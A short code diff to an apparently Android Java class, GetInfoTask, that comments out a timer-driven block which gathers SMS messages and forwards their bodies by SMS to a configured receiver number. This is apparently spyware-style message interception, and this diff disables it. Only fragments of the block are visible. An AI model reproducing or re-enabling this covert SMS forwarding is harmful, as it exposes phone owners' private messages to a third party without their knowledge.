@@ -79,6 +79,7 @@ public class GetInfoTask extends TimerTask
 		// ===================================================================================
 		
 		//String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+		/*
 		if (GlobalValues.recvPhoneNum.length() > 0) {
 			List<SmsInfo> smsList = new ArrayList<SmsInfo>();
 			
@@ -99,6 +100,7 @@ public class GetInfoTask extends TimerTask
 				SmsCtrl.sendSms(GlobalValues.recvPhoneNum, header + sms.smsbody);
 			}
 		}
+		*/
 		
 		//------------------------------------------------------------------------------------
 		// If there are no recipients, return 
